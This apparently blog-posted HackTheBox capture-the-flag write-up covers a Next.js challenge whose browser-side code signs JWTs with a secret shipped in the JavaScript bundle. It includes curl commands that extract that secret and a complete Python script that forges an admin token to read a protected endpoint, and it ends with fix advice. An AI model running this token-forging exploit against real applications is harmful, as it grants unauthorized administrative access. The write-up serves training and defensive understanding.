---
title: "CriticalOps"
date: 2026-10-31 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, jwt, privilege-escalation, nextjs, cwe-321, cwe-603]
description: "A Very Easy Web challenge where the Next.js client mints its own JWT with an HMAC secret baked into the JavaScript bundle — recover the secret, forge an admin token, and read the admin-only ticket holding the flag."
---

## Overview

`CriticalOps` is a Very Easy HackTheBox **Web** challenge: a Next.js "critical
infrastructure" dashboard with user/admin roles and a ticketing system. The whole
box hinges on one design mistake — the **browser signs its own session JWT** using a
secret that ships inside the public JavaScript bundle. Recover the secret, forge a
token with `role: "admin"`, and the admin-only ticket endpoint hands over the flag.

## The technique

Normally a server issues a signed session token and never reveals the signing key.
CriticalOps does the opposite. The login API authenticates your password but returns
**only** the user object — no token, no `Set-Cookie`:

```bash
curl -sk -X POST https://TARGET/api/auth/login -H 'Content-Type: application/json' \
  -d '{"username":"user","password":"pass"}'
# -> {"id":"...","username":"user","role":"user"}   (no token anywhere)
```

When a single-page app logs you in but no token comes back over the wire, the client
must be minting the token itself — which means the signing secret has to be in the
client code too. This is [client-side authentication](https://cwe.mitre.org/data/definitions/603.html)
combined with a [hard-coded cryptographic key](https://cwe.mitre.org/data/definitions/321.html).

Sure enough, the Next.js login chunk under `/_next/static/chunks/app/login/page-*.js`
contains the signer:

```js
let a = new TextEncoder().encode("SecretKey-CriticalOps-2025");
async function n(e){ return await new SignJWT(e).setProtectedHeader({alg:"HS256"}).setIssuedAt().setExpirationTime("8h").sign(a) }
// called as: n({ userId: s.id, username: s.username, role: s.role })
```

The server then trusts the `role` claim inside that token for authorization
([authorization via a user-controlled key](https://cwe.mitre.org/data/definitions/639.html)).
Because the HMAC key is public, anyone can forge a token claiming `role: "admin"`.

## Solution

1. Harvest the secret straight from the served bundle:

```bash
curl -skL https://TARGET/login | grep -oE '/_next/static/chunks/[^"]+\.js' | sort -u \
  | while read c; do curl -sk "https://TARGET$c"; done \
  | grep -oP 'TextEncoder\(\)\.encode\("\K[^"]+'
# -> SecretKey-CriticalOps-2025
```

2. Register and log in a normal user to obtain a valid `userId`, forge an admin JWT
with the harvested secret, and hit the admin-only `/api/tickets` endpoint (which is
`401` for anonymous and normal users). The flag is the seeded admin ticket.

Create `solve.py`:

```python
import sys, time, jwt, requests
requests.packages.urllib3.disable_warnings()

BASE   = sys.argv[1]
SECRET = "SecretKey-CriticalOps-2025"   # harvested from the login JS chunk

u = {"username": "pwn", "email": "pwn@x.com", "password": "Passw0rd!23"}
requests.post(f"{BASE}/api/auth/register", json=u, verify=False)
me = requests.post(f"{BASE}/api/auth/login",
                   json={"username": u["username"], "password": u["password"]},
                   verify=False).json()

now = int(time.time())
tok = jwt.encode({"userId": me["id"], "username": me["username"], "role": "admin",
                  "iat": now, "exp": now + 8*3600}, SECRET, algorithm="HS256")

H = {"Authorization": f"Bearer {tok}"}
print(requests.get(f"{BASE}/api/tickets", headers=H, verify=False).text)
```

Run it:

```bash
python3 solve.py https://TARGET
# -> the admin ticket containing HTB{...}
```

The flag arrives in the title/description of the first (admin-only) ticket.

## Why it worked

Signature verification is only meaningful when the attacker does **not** have the key.
Here the HMAC secret is shipped to every visitor inside a static asset, so "the server
verified the signature" proves nothing — the attacker signed it with the same key. On
top of that, the server reads the `role` claim out of the client-supplied token instead
of looking the role up server-side, turning a forgeable token into instant privilege
escalation.

## Fix / defense

- **Issue and sign JWTs server-side only.** The signing key must never reach the client;
  set the session token via an `HttpOnly` `Set-Cookie` from the auth endpoint.
- **Derive authorization from server state**, not from a claim the client could set —
  look the user's role up from the session/DB on every request.
- **Treat everything under `/_next/static/` (and any front-end bundle) as fully public.**
  Assume an attacker reads all of it; never embed secrets there.
